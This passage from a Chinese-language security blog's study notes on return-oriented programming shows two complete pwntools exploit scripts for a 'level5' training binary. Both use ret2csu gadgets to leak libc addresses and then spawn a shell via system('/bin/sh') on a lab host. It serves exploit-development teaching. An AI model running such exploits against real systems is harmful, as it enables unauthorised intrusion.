class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400623</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(gadget2)</span><br><span class="line">	payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">	payload += p64(ret)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write addr..."</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">exp += p64(pop_rdi_ret)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/34.png" alt=""></p>
<p>当然，也可以不用LibcSearcher这个工具包，而是直接通过查询Libc Database Search的方式自己写地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./level5')</span></span><br><span class="line">p = remote(<span class="string">'192.168.17.155'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400623</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(gadget2)</span><br><span class="line">	payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">	payload += p64(ret)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write addr..."</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">## libc db search</span></span><br><span class="line"><span class="comment">## leak write low 3: 2b0</span></span><br><span class="line">system_offset = <span class="number">0x045390</span></span><br><span class="line">binsh_offset = <span class="number">0x18cd57</span></span><br><span class="line">write_offset = <span class="number">0x0f72b0</span></span><br><span class="line">libc_base = write_addr - write_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">exp += p64(pop_rdi_ret)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/36.png" alt=""></p>
<p>getshell：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/35.png" alt=""></p>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://segmentfault.com/a/1190000005888964" target="_blank" rel="noopener">一步一步学ROP之Linux_x86篇</a></p>
<p><a href="https://segmentfault.com/a/1190000007406442" target="_blank" rel="noopener">一步一步学ROP之Linux_x64篇</a></p>

    </div>

  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-32位ROP"><span class="toc-text">0x01 32位ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1——栈上执行shellcode"><span class="toc-text">level1——栈上执行shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2——ret2libc绕过NX"><span class="toc-text">level2——ret2libc绕过NX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2——ROP绕过NX和ASLR"><span class="toc-text">level2——ROP绕过NX和ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2——Memory-Leak-amp-DynELF"><span class="toc-text">level2——Memory Leak &amp; DynELF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-64位ROP"><span class="toc-text">0x02 64位ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level3——64位与32位区别"><span class="toc-text">level3——64位与32位区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4——使用工具寻找gadgets"><span class="toc-text">level4——使用工具寻找gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5——通用gadgets"><span class="toc-text">level5——通用gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Method1——只用ret2csu的Gadget"><span class="toc-text">Method1——只用ret2csu的Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Method2——利用两个Gadgets"><span class="toc-text">Method2——利用两个Gadgets</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>


  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2019/04/07/pwntools笔记/" rel="next" title="pwntools笔记">
          pwntools笔记
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2019/04/12/中级ROP之ret2csu/" rel="prev" title="栈溢出之ret2csu">
            栈溢出之ret2csu
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    
    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <span>Copyright &copy; Mi1k7ea</span>  |  
        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
    </div>
</footer>

  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



  
<script>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
</script>


</body>
</html>
